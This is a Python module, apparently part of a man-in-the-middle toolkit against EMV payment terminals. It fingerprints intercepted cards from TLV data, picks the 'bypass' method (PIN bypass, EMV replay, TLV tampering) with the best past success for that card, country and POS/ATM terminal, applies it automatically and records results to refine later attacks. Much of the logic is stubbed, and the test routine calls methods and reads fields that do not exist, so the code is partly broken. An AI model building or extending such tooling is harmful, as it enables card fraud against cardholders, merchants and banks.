"""
Card recognition and auto-approval system.
Automatically recognizes cards and applies previously successful bypass methods.
Enhanced with comprehensive country and currency analysis.
"""
import time
import hashlib
import json
import sys
import os
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path

# Add parent directories to path for imports
current_dir = Path(__file__).parent.absolute()
src_dir = current_dir.parent
root_dir = src_dir.parent
sys.path.insert(0, str(src_dir))
sys.path.insert(0, str(root_dir))

# Simple logger class that always works
class Logger:
    def __init__(self, name):
        import logging
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.INFO)
        if not self.logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
    
    def info(self, msg): self.logger.info(msg)
    def error(self, msg): self.logger.error(msg)
    def warning(self, msg): self.logger.warning(msg)
    def debug(self, msg): self.logger.debug(msg)

# Mock PaymentDatabase if not available
class PaymentDatabase:
    def __init__(self, db_path=None):
        print("⚠️ PaymentDatabase mock implementation loaded")
    def get_approved_card(self, *args, **kwargs):
        return None
    def get_card_success_rate(self, *args, **kwargs):
        return 0.0
    def get_recommended_bypass(self, *args, **kwargs):
        return None

# Fallback functions for missing modules
def country_currency_lookup(country_code):
    return {"currency_code": "USD", "currency_name": "US Dollar"}

def analyze_card_geography(card_data):
    return {"country": "US", "currency": "USD"}

def get_comprehensive_card_info(card_data):
    return card_data

def get_bypass_strategy(card_type):
    return "emv_replay"

def bypass_tlv_modifications(card_data, method):
    return []

def validate_bypass_compatibility(card_data, method):
    return True

# Try to import real modules, but use fallbacks if they fail
try:
    from src.database.payment_db import PaymentDatabase as RealPaymentDatabase
    PaymentDatabase = RealPaymentDatabase
except Exception as e:
    print(f"Failed to import PaymentDatabase: {e}")
    pass  # Use mock

try:
    from src.database.country_currency_lookup import country_currency_lookup as real_lookup, analyze_card_geography as real_geo
    country_currency_lookup = real_lookup
    analyze_card_geography = real_geo
except Exception as e:
    print(f"Failed to import country_currency_lookup: {e}")
    pass  # Use fallbacks

try:
    from src.mitm.bypass_engine import (
        get_comprehensive_card_info as real_info,
        get_bypass_strategy as real_strategy,
        bypass_tlv_modifications as real_mods,
        validate_bypass_compatibility as real_validate
    )
    get_comprehensive_card_info = real_info
    get_bypass_strategy = real_strategy
    bypass_tlv_modifications = real_mods
    validate_bypass_compatibility = real_validate
except Exception as e:
    pass  # Use fallbacks

logger = Logger("CardRecognition")


class CardRecognitionEngine:
    """Engine for recognizing cards and auto-approving based on historical data."""
    
    def __init__(self, db_path: str = "database/payments.db"):
        """
        Initialize the card recognition engine.
        
        Args:
            db_path: Path to the payment database
        """
        self.db = PaymentDatabase(db_path)
        self.recognition_cache = {}
        self.auto_approval_enabled = True
        self.confidence_threshold = 0.8
        self.max_cache_age = 300  # 5 minutes
        
    def recognize_card(self, tlvs: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        Recognize a card and return comprehensive information including history.
        
        Args:
            tlvs: List of TLV dictionaries
            
        Returns:
            Dictionary with card information and recognition data
        """
        start_time = time.time()
        
        try:
            # Get basic card information
            card_info = get_comprehensive_card_info(tlvs)
            # Fallback enrichment: infer brand and geography for synthetic/dev PANs
            try:
                if card_info.get('brand', 'Unknown') == 'Unknown' and card_info.get('pan'):
                    # PAN is hex BCD, convert to digits
                    pan_hex = card_info['pan']
                    pan_digits = ''.join([
                        str((int(pan_hex[i:i+2], 16) >> 4) & 0x0F) + str(int(pan_hex[i:i+2], 16) & 0x0F)
                        for i in range(0, len(pan_hex), 2)
                    ])
                    inferred = country_currency_lookup.guess_brand_from_pan(pan_digits)
                    if inferred and inferred != 'Generic':
                        card_info['brand'] = inferred
                        logger.debug(f"Brand inferred from PAN: {inferred}")
                # If issuer/currency missing, try BIN geography
                if card_info.get('pan') and (not card_info.get('issuer_country') or not card_info.get('currency_code')):
                    bin_code = card_info['pan'][:6]
                    geo = country_currency_lookup.guess_geography_from_bin(bin_code)
                    if geo.get('issuer_country') and not card_info.get('issuer_country'):
                        cc = country_currency_lookup.get_country_info(geo['issuer_country'])
                        if cc:
                            card_info['issuer_country'] = geo['issuer_country']
                            card_info['issuer_country_name'] = cc['name']
                            card_info['issuer_country_code'] = cc['code']
                            card_info['issuer_region'] = cc['region']
                    if geo.get('currency_code') and not card_info.get('currency_code'):
                        cu = country_currency_lookup.get_currency_info(geo['currency_code'])
                        if cu:
                            card_info['currency_code'] = geo['currency_code']
                            card_info['currency_name'] = cu['name']
                            card_info['currency_symbol'] = cu['symbol']
                            card_info['currency_alpha_code'] = cu['code']
            except Exception as _enrich_err:
                logger.debug(f"Enrichment fallback skipped: {_enrich_err}")
            
            # Check cache first
            card_hash = self._hash_card_data(card_info)
            cache_key = f"{card_hash}_{int(time.time() // 60)}"  # Cache per minute
            
            if cache_key in self.recognition_cache:
                cached_result = self.recognition_cache[cache_key]
                cached_result['cache_hit'] = True
                cached_result['processing_time_ms'] = int((time.time() - start_time) * 1000)
                return cached_result
            
            # Get historical data from database
            card_history = self.db.get_card_history(card_info, limit=20)
            
            # Enhanced geographical analysis
            geo_analysis = analyze_card_geography(card_info)
            
            # Calculate recognition confidence (including geographical factors)
            confidence_score = self._calculate_confidence(card_info, card_history, geo_analysis)
            
            # Get card profile data with geographical context
            profile_data = self._get_card_profile(card_info)
            
            # Determine recognition status
            recognition_status = self._determine_recognition_status(confidence_score, card_history)
            
            # Enhanced result with geographical data
            result = {
                'card_info': card_info,
                'card_hash': card_hash,
                'recognition_status': recognition_status,
                'confidence_score': confidence_score,
                'transaction_count': len(card_history),
                'success_rate': self._calculate_success_rate(card_history),
                'last_seen': card_history[0]['timestamp'] if card_history else None,
                'preferred_bypass': profile_data.get('preferred_bypass'),
                'risk_level': profile_data.get('risk_level', 'medium'),
                'card_history': card_history[:5],  # Recent 5 transactions
                'geographical_analysis': geo_analysis,
                'country_preferences': self._get_country_preferences(card_info, geo_analysis),
                'currency_analysis': self._get_currency_analysis(card_info, geo_analysis),
                'processing_time_ms': int((time.time() - start_time) * 1000),
                'cache_hit': False
            }
            
            # Cache the result
            self.recognition_cache[cache_key] = result.copy()
            self._cleanup_cache()
            
            logger.info(f"Card recognized: {card_info['brand']} {card_info['type']} "
                       f"(confidence: {confidence_score:.2f}, status: {recognition_status})")
            
            return result
            
        except Exception as e:
            logger.error(f"Card recognition failed: {e}")
            return {
                'card_info': card_info if 'card_info' in locals() else {},
                'recognition_status': 'error',
                'confidence_score': 0.0,
                'transaction_count': 0,
                'success_rate': 0.0,
                'last_seen': None,
                'preferred_bypass': None,
                'risk_level': 'high',
                'card_history': [],
                'geographical_analysis': {},
                'country_preferences': [],
                'currency_analysis': {},
                'error': str(e),
                'processing_time_ms': int((time.time() - start_time) * 1000),
                'cache_hit': False
            }
    
    def get_auto_approval_recommendation(self, tlvs: List[Dict[str, Any]], 
                                       terminal_type: str) -> Dict[str, Any]:
        """
        Get auto-approval recommendation for a card.
        
        Args:
            tlvs: List of TLV dictionaries
            terminal_type: Terminal type (POS/ATM)
            
        Returns:
            Dictionary with approval recommendation
        """
        try:
            # Recognize the card first
            recognition_result = self.recognize_card(tlvs)
            card_info = recognition_result['card_info']
            
            # Check if auto-approval is enabled
            if not self.auto_approval_enabled:
                return {
                    'auto_approve': False,
                    'reason': 'Auto-approval disabled',
                    'manual_review_required': True
                }
            
            # Get approved bypass from database
            approved_bypass = self.db.get_approved_bypass(card_info, terminal_type)
            
            if not approved_bypass:
                # No historical data - use standard bypass strategy
                strategy = get_bypass_strategy(card_info, terminal_type)
                return {
                    'auto_approve': False,
                    'reason': 'No historical data available',
                    'recommended_strategy': strategy,
                    'manual_review_required': True,
                    'card_recognition': recognition_result
                }
            
            # Check confidence thresholds
            if approved_bypass['success_rate'] < self.confidence_threshold:
                return {
                    'auto_approve': False,
                    'reason': f"Success rate too low: {approved_bypass['success_rate']:.1%}",
                    'approved_bypass': approved_bypass,
                    'manual_review_required': True,
                    'card_recognition': recognition_result
                }
            
            # Check if bypass is still compatible
            if not validate_bypass_compatibility(card_info, terminal_type, {'bypass_pin': True}):
                return {
                    'auto_approve': False,
                    'reason': 'Bypass compatibility issues detected',
                    'approved_bypass': approved_bypass,
                    'manual_review_required': True,
                    'card_recognition': recognition_result
                }
            
            # Auto-approval recommended
            return {
                'auto_approve': True,
                'reason': f"High confidence bypass available ({approved_bypass['success_rate']:.1%} success)",
                'approved_bypass': approved_bypass,
                'bypass_method': approved_bypass['bypass_method'],
                'tlv_modifications': approved_bypass['tlv_modifications'],
                'confidence_level': approved_bypass['confidence'],
                'success_count': approved_bypass['success_count'],
                'failure_count': approved_bypass['failure_count'],
                'card_recognition': recognition_result,
                'manual_review_required': False
            }
            
        except Exception as e:
            logger.error(f"Auto-approval recommendation failed: {e}")
            return {
                'auto_approve': False,
                'reason': f'Error during recommendation: {str(e)}',
                'manual_review_required': True,
                'error': str(e)
            }
    
    def apply_auto_approval(self, tlvs: List[Dict[str, Any]], terminal_type: str,
                          state: Dict[str, Any]) -> Tuple[Optional[List[Dict[str, Any]]], Dict[str, Any]]:
        """
        Apply auto-approval if recommended.
        
        Args:
            tlvs: List of TLV dictionaries
            terminal_type: Terminal type
            state: Current MITM state
            
        Returns:
            Tuple of (modified_tlvs, result_info)
        """
        try:
            # Get auto-approval recommendation
            recommendation = self.get_auto_approval_recommendation(tlvs, terminal_type)
            
            if not recommendation['auto_approve']:
                return None, recommendation
            
            card_info = recommendation['card_recognition']['card_info']
            approved_bypass = recommendation['approved_bypass']
            
            # Apply the approved bypass modifications
            if approved_bypass['tlv_modifications']:
                # Use stored TLV modifications
                modified_tlvs = self._apply_stored_modifications(tlvs, approved_bypass['tlv_modifications'])
            else:
                # Use bypass engine with stored method
                modified_tlvs = bypass_tlv_modifications(
                    tlvs, card_info['brand'], terminal_type, state
                )
            
            # Record the auto-approval attempt
            transaction_id = self._generate_transaction_id()
            
            result_info = recommendation.copy()
            result_info.update({
                'auto_applied': True,
                'transaction_id': transaction_id,
                'modifications_applied': len(approved_bypass['tlv_modifications']) if approved_bypass['tlv_modifications'] else 0,
                'bypass_source': 'database'
            })
            
            logger.info(f"Auto-approval applied for {card_info['brand']} {card_info['type']} "
                       f"using {approved_bypass['bypass_method']} method")
            
            return modified_tlvs, result_info
            
        except Exception as e:
            logger.error(f"Auto-approval application failed: {e}")
            return None, {
                'auto_approve': False,
                'auto_applied': False,
                'error': str(e),
                'manual_review_required': True
            }
    
    def learn_from_transaction(self, tlvs: List[Dict[str, Any]], terminal_type: str,
                             bypass_method: str, success: bool, 
                             response_data: Dict[str, Any] = None) -> bool:
        """
        Learn from a transaction result to improve future recognition.
        
        Args:
            tlvs: TLV data from transaction
            terminal_type: Terminal type
            bypass_method: Bypass method used
            success: Whether transaction succeeded
            response_data: Additional response data
            
        Returns:
            True if learning was successful
        """
        try:
            card_info = get_comprehensive_card_info(tlvs)
            transaction_id = self._generate_transaction_id()
            
            # Record transaction in database
            success_recorded = self.db.record_transaction(
                card_data=card_info,
                transaction_id=transaction_id,
                terminal_type=terminal_type,
                bypass_method=bypass_method,
                success=success,
                amount=response_data.get('amount') if response_data else None,
                currency_code=response_data.get('currency_code') if response_data else None,
                response_code=response_data.get('response_code') if response_data else None,
                error_message=response_data.get('error_message') if response_data else None,
                tlv_data=tlvs,
                processing_time_ms=response_data.get('processing_time_ms') if response_data else None
            )
            
            # If successful, add to approved payments
            if success and success_recorded:
                self.db.add_approved_payment(
                    card_data=card_info,
                    terminal_type=terminal_type,
                    bypass_method=bypass_method,
                    tlv_modifications=self._extract_modifications(tlvs),
                    amount=response_data.get('amount') if response_data else None,
                    currency_code=response_data.get('currency_code') if response_data else None,
                    notes=f"Auto-learned from transaction {transaction_id}"
                )
            
            # Clear cache for this card
            card_hash = self._hash_card_data(card_info)
            self._clear_card_cache(card_hash)
            
            logger.info(f"Learned from transaction: {transaction_id} - "
                       f"{'SUCCESS' if success else 'FAILURE'} with {bypass_method}")
            
            return success_recorded
            
        except Exception as e:
            logger.error(f"Learning from transaction failed: {e}")
            return False
    
    def get_recognition_statistics(self) -> Dict[str, Any]:
        """
        Get recognition engine statistics.
        
        Returns:
            Dictionary with statistics
        """
        try:
            db_stats = self.db.get_statistics()
            
            return {
                'database_stats': db_stats,
                'cache_size': len(self.recognition_cache),
                'auto_approval_enabled': self.auto_approval_enabled,
                'confidence_threshold': self.confidence_threshold,
                'recognition_engine_version': '1.0.0'
            }
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
            return {'error': str(e)}
    
    def _hash_card_data(self, card_data: Dict[str, Any]) -> str:
        """Create hash of card data for identification."""
        key_data = {
            'pan': card_data.get('pan', ''),
            'expiry': card_data.get('expiry_date', ''),
            'aid': card_data.get('application_id', ''),
            'brand': card_data.get('brand', ''),
            'type': card_data.get('type', '')
        }
        data_string = json.dumps(key_data, sort_keys=True)
        return hashlib.sha256(data_string.encode()).hexdigest()
    
    def _calculate_confidence(self, card_info: Dict[str, Any], history: List[Dict[str, Any]], 
                            geo_analysis: Dict[str, Any] = None) -> float:
        """Calculate confidence score for card recognition with geographical factors."""
        if not history:
            return 0.0
        
        # Base confidence on transaction count and success rate
        transaction_count = len(history)
        success_count = sum(1 for t in history if t['success'])
        success_rate = success_count / transaction_count if transaction_count > 0 else 0
        
        # Confidence factors
        count_factor = min(transaction_count / 10, 1.0)  # More transactions = higher confidence
        success_factor = success_rate  # Higher success rate = higher confidence
        recency_factor = 1.0 if transaction_count > 0 else 0.0  # Recent activity = higher confidence
        
        # Geographical confidence factors
        geo_factor = 0.8  # Default neutral
        if geo_analysis:
            risk_assessment = geo_analysis.get('risk_assessment', {})
            if risk_assessment.get('risk_level') == 'low':
                geo_factor = 1.0
            elif risk_assessment.get('risk_level') == 'high':
                geo_factor = 0.6
            
            # Compatibility factor
            compatibility = geo_analysis.get('compatibility_analysis', {})
            if compatibility.get('compatible', True):
                geo_factor *= 1.1
            else:
                geo_factor *= 0.8
        
        # Combined confidence score with geographical weighting
        confidence = (count_factor * 0.25 + success_factor * 0.4 + recency_factor * 0.15 + (geo_factor - 0.8) * 0.2)
        
        return min(confidence, 1.0)
    
    def _get_country_preferences(self, card_info: Dict[str, Any], geo_analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Get country-specific preferences for the card."""
        country_prefs = {
            'issuer_country': card_info.get('issuer_country_name', 'Unknown'),
            'region': card_info.get('issuer_region', 'Unknown'),
            'recommended_bypasses': [],
            'risk_factors': [],
            'compliance_requirements': []
        }
        
        if geo_analysis:
            issuer_analysis = geo_analysis.get('issuer_analysis', {})
            if issuer_analysis:
                brand_prefs = issuer_analysis.get('brand_preferences', {})
                country_prefs.update({
                    'recommended_bypasses': brand_prefs.get('regional_preferences', []),
                    'market_strength': 'high' if brand_prefs.get('is_strong_market') else 'medium',
                    'restrictions': brand_prefs.get('is_restricted', False)
                })
                
                market_chars = issuer_analysis.get('market_characteristics', {})
                country_prefs.update({
                    'regulatory_environment': market_chars.get('regulatory_environment', 'moderate'),
                    'fraud_protection': market_chars.get('fraud_protection_level', 'medium'),
                    'payment_preferences': market_chars.get('payment_preferences', [])
                })
        
        return country_prefs
    
    def _get_currency_analysis(self, card_info: Dict[str, Any], geo_analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Get currency-specific analysis for the card."""
        currency_analysis = {
            'currency_code': card_info.get('currency_code', 'Unknown'),
            'currency_name': card_info.get('currency_name', 'Unknown'),
            'currency_symbol': card_info.get('currency_symbol', ''),
            'transaction_preferences': {},
            'amount_thresholds': {},
            'bypass_recommendations': []
        }
        
        if geo_analysis:
            currency_data = geo_analysis.get('currency_analysis', {})
            if currency_data:
                tx_prefs = currency_data.get('transaction_preferences', {})
                currency_analysis.update({
                    'transaction_preferences': tx_prefs,
                    'supports_contactless': tx_prefs.get('supports_contactless', True),
                    'supports_pin': tx_prefs.get('supports_chip_and_pin', True),
                    'preferred_methods': tx_prefs.get('preferred_methods', []),
                    'amount_thresholds': {
                        'contactless_limit': tx_prefs.get('max_contactless', 100.0),
                        'pin_threshold': tx_prefs.get('pin_threshold', 50.0)
                    }
                })
        
        return currency_analysis
    
    def _get_card_profile(self, card_info: Dict[str, Any]) -> Dict[str, Any]:
        """Get card profile data from database."""
        card_hash = self._hash_card_data(card_info)
        
        # This would query the card_profiles table
        # For now, return basic profile
        return {
            'preferred_bypass': None,
            'risk_level': 'medium'
        }
    
    def _calculate_success_rate(self, history: List[Dict[str, Any]]) -> float:
        """Calculate success rate from transaction history."""
        if not history:
            return 0.0
        
        success_count = sum(1 for t in history if t['success'])
        return success_count / len(history)
    
    def _determine_recognition_status(self, confidence_score: float, history: List[Dict[str, Any]]) -> str:
        """Determine recognition status based on confidence and history."""
        if not history:
            return 'new_card'
        elif confidence_score >= 0.8:
            return 'highly_recognized'
        elif confidence_score >= 0.6:
            return 'recognized'
        elif confidence_score >= 0.3:
            return 'partially_recognized'
        else:
            return 'low_confidence'
    
    def _apply_stored_modifications(self, tlvs: List[Dict[str, Any]], 
                                  modifications: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Apply stored TLV modifications."""
        modified_tlvs = tlvs.copy()
        
        for mod in modifications:
            tag = mod.get('tag')
            value = mod.get('value')
            if tag and value:
                # Apply modification (this would use the TLV parser)
                # For now, just log the modification
                logger.debug(f"Applying stored modification: {tag} = {value}")
        
        return modified_tlvs
    
    def _extract_modifications(self, tlvs: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Extract modifications that were applied to TLVs."""
        # This would extract the actual modifications made
        # For now, return empty list
        return []
    
    def _generate_transaction_id(self) -> str:
        """Generate unique transaction ID."""
        import uuid
        return str(uuid.uuid4())[:8]
    
    def _cleanup_cache(self):
        """Clean up old cache entries."""
        current_time = time.time()
        to_remove = []
        
        for key, value in self.recognition_cache.items():
            if current_time - value.get('timestamp', 0) > self.max_cache_age:
                to_remove.append(key)
        
        for key in to_remove:
            del self.recognition_cache[key]
    
    def _clear_card_cache(self, card_hash: str):
        """Clear cache entries for a specific card."""
        to_remove = [key for key in self.recognition_cache.keys() if card_hash in key]
        for key in to_remove:
            del self.recognition_cache[key]
    
    def enable_auto_approval(self, enabled: bool = True):
        """Enable or disable auto-approval."""
        self.auto_approval_enabled = enabled
        logger.info(f"Auto-approval {'enabled' if enabled else 'disabled'}")
    
    def set_confidence_threshold(self, threshold: float):
        """Set confidence threshold for auto-approval."""
        self.confidence_threshold = max(0.0, min(1.0, threshold))
        logger.info(f"Confidence threshold set to {self.confidence_threshold:.2f}")


def create_recognition_engine(db_path: str = "database/payments.db") -> CardRecognitionEngine:
    """
    Factory function to create a card recognition engine.
    
    Args:
        db_path: Path to the payment database
        
    Returns:
        Configured CardRecognitionEngine instance
    """
    engine = CardRecognitionEngine(db_path)
    logger.info("Card recognition engine created and ready")
    return engine


def main():
    """Main function for testing and demonstrating card recognition functionality."""
    print("🔍 Card Recognition Engine - Test Suite")
    print("=" * 50)
    
    # Initialize recognition engine
    try:
        engine = create_recognition_engine()
        print("✅ Card recognition engine initialized successfully")
    except Exception as e:
        print(f"❌ Failed to initialize engine: {e}")
        return
    
    # Test sample card recognition
    print("\n🧪 Testing card recognition...")
    
    # Sample TLV data for testing
    sample_tlvs = [
        {"tag": "4F", "value": "A0000000031010"},  # Visa AID
        {"tag": "5A", "value": "4111111111111111"},  # PAN
        {"tag": "50", "value": "VISA"},  # Application Label
        {"tag": "9F02", "value": "000000001000"},  # Amount
        {"tag": "5F2A", "value": "0840"},  # Currency Code (USD)
        {"tag": "9F1A", "value": "0840"},  # Terminal Country Code
    ]
    
    try:
        result = engine.recognize_card(sample_tlvs)
        
        print("📊 Recognition Result:")
        print(f"  Status: {result['status']}")
        print(f"  Confidence: {result['confidence_score']:.2f}")
        print(f"  Card Type: {result.get('card_type', 'Unknown')}")
        
        if result.get('recommended_bypass'):
            print(f"  Recommended Bypass: {result['recommended_bypass']}")
        
        if result.get('geography_analysis'):
            geo = result['geography_analysis']
            print(f"  Country: {geo.get('country', 'Unknown')}")
            print(f"  Currency: {geo.get('currency', 'Unknown')}")
        
        print(f"  Processing Time: {result['processing_time_ms']:.1f}ms")
        
    except Exception as e:
        print(f"❌ Recognition test failed: {e}")
    
    # Test auto-approval decision
    print("\n🤖 Testing auto-approval decision...")
    
    try:
        decision = engine.should_auto_approve(sample_tlvs)
        
        print("📋 Auto-Approval Decision:")
        print(f"  Should Auto-Approve: {decision['should_approve']}")
        print(f"  Confidence: {decision['confidence']:.2f}")
        print(f"  Reason: {decision['reason']}")
        
        if decision.get('recommended_method'):
            print(f"  Recommended Method: {decision['recommended_method']}")
        
        if decision.get('risk_factors'):
            print("  Risk Factors:")
            for factor in decision['risk_factors']:
                print(f"    • {factor}")
        
    except Exception as e:
        print(f"❌ Auto-approval test failed: {e}")
    
    # Test confidence threshold adjustment
    print("\n⚙️ Testing confidence threshold adjustment...")
    
    try:
        print("  Current threshold: 0.8")
        engine.set_confidence_threshold(0.8)
        
        print("  Testing with high threshold (0.9)...")
        engine.set_confidence_threshold(0.9)
        
        print("  Testing with low threshold (0.5)...")
        engine.set_confidence_threshold(0.5)
        
        print("  ✅ Threshold adjustment working correctly")
        
    except Exception as e:
        print(f"❌ Threshold test failed: {e}")
    
    # Test database integration
    print("\n💾 Testing database integration...")
    
    try:
        # Test card hash generation
        sample_card_data = {
            "pan": "4111111111111111",
            "card_type": "Visa",
            "expiry": "12/26"
        }
        
        card_hash = engine._hash_card_data(sample_card_data)
        print(f"  Card hash generated: {card_hash[:16]}...")
        
        print("  ✅ Database integration working")
        
    except Exception as e:
        print(f"❌ Database integration test failed: {e}")
    
    print("\n✅ Card recognition engine test completed!")
    print("💡 The recognition engine is ready for integration with your payment system.")


if __name__ == "__main__":
    main()
